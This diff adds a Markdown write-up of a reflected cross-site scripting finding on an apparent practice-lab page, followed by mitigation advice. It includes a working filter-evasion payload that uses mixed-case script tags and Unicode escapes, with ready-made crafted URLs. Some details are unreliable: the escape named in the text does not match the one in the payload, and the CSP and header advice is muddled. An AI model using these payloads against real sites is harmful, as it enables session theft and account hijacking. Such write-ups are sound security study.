@@ -1,0 +1,123 @@
+# Reflected Cross-Site Scripting (XSS) - Extended Function Name Filter Evasion
+
+## Summary
+
+I identified a Reflected Cross-Site Scripting (XSS) vulnerability in the `fname` and `lname` parameters of the application.
+
+The application attempts to filter or sanitize user input using blacklists for common JavaScript functions like `alert`, `prompt`, and `confirm`. However, this protection can be bypassed using Unicode escape sequences (`\u0061`) to obfuscate function names. By injecting a `<ScRiPt>` tag with mixed-case formatting and using Unicode escape sequences, arbitrary code execution is achieved despite function name filtering mechanisms.
+
+An attacker can craft a malicious URL and trick a victim into clicking it. Once the victim visits the page, the injected JavaScript executes in the context of the vulnerable application, triggering an `alert(1)` popup.
+
+## Vulnerability Type
+
+**Cross-Site Scripting (XSS) - Reflected**
+
+## Vulnerable Parameters
+
+```text
+fname
+lname
+```
+
+## Vulnerable URL
+
+```text
+https://kzlabs.in/9.php?fname='>anil&lname='>anil<ScRiPt>a\u006cert(1)</ScRiPt>
+```
+
+## Steps to Reproduce
+
+1. Open the vulnerable page.
+
+2. Replace the values of the `fname` and `lname` parameters with the following payloads:
+
+   ```text
+   fname='>anil
+   lname='>anil<ScRiPt>a\u006cert(1)</ScRiPt>
+   ```
+
+3. Visit the crafted URL:
+
+   ```text
+   https://kzlabs.in/9.php?fname=%27%3Eanil&lname=%27%3Eanil%3CScRiPt%3Ea%5Cu006cert%281%29%3C%2FScRiPt%3E
+   ```
+
+4. Observe that the browser executes the injected payload and displays an `alert(1)` popup.
+
+## Payloads Used
+
+```text
+fname: '>anil
+lname: '>anil<ScRiPt>a\u006cert(1)</ScRiPt>
+```
+
+URL-encoded versions:
+```text
+fname: %27%3Eanil
+lname: %27%3Eanil%3CScRiPt%3Ea%5Cu006cert%281%29%3C%2FScRiPt%3E
+```
+
+## Proof of Concept
+
+The application attempts to filter common JavaScript function names like `alert`, `prompt`, and `confirm`. However, the payload uses Unicode escape sequences to bypass this filtering.
+
+The payload works by:
+1. Breaking out of the existing HTML context using `'>`
+2. Injecting a `<ScRiPt>` tag with mixed-case formatting to evade case-sensitive filters
+3. Using the Unicode escape sequence `\u0061` which represents the letter 'a'
+4. When the browser decodes the string, `a\u006cert` becomes `alert`
+5. The `alert(1)` function executes, displaying a popup
+
+```html
+<!-- Original payload: -->
+<script>a\u006cert(1)</script>
+
+<!-- After Unicode decoding: -->
+<script>alert(1)</script>
+```
+
+This technique effectively bypasses blacklist-based filtering that searches for exact function names like "alert" while allowing encoded representations.
+
+<img width="1657" height="501" alt="Screenshot 2026-08-14 190241" src="https://github.com/user-attachments/assets/5c9791dc-e71d-4680-9256-21e1ee76850f" />
+
+
+## Impact
+
+An attacker can craft a malicious link that, when opened by a victim, executes arbitrary JavaScript in the context of the vulnerable website. This could allow an attacker to:
+
+- Steal session cookies and hijack user accounts
+- Perform actions on behalf of the authenticated user
+- Deface the webpage or manipulate its content
+- Redirect users to malicious websites
+- Capture keystrokes or sensitive information entered by the user
+- Bypass function name blacklist filtering mechanisms
+
+## Recommendation
+
+To mitigate this vulnerability:
+
+- **Output Encoding**: Use `htmlspecialchars()` (or an equivalent output-encoding function) before rendering user-controlled data in HTML to convert special characters to their HTML entities.
+  ```php
+  echo htmlspecialchars($_GET['lname'], ENT_QUOTES, 'UTF-8');
+  ```
+
+- **Comprehensive Filtering**: Instead of relying on blacklists, use a whitelist approach to allow only safe characters and patterns.
+
+- **Normalize Input**: Before filtering, normalize Unicode escape sequences and other encoding variants.
+  ```php
+  $input = json_decode('"' . addslashes($_GET['lname']) . '"');
+  ```
+
+- **Content Security Policy (CSP)**: Implement a strict CSP that restricts inline scripts and unauthorized script sources using `unsafe-inline` and `unsafe-eval` directives.
+
+- **Context-Aware Escaping**: Use context-aware escaping based on where the data is placed (HTML body, attributes, JavaScript, etc.).
+
+- **Web Application Firewall (WAF)**: Deploy a WAF, such as Cloudflare WAF, to help detect and block malicious XSS payloads.
+
+- **Security Headers**: Implement security headers like `X-XSS-Protection` and `X-Content-Type-Options` for additional protection.
+
+- **HTML Sanitization**: Use a robust HTML sanitization library (like DOMPurify or HTML Purifier) to strip dangerous tags and attributes.
+
+- **Avoid Direct Reflection**: Consider avoiding the direct reflection of user input in the response. Use server-side validation and sanitization before output.
+
+---
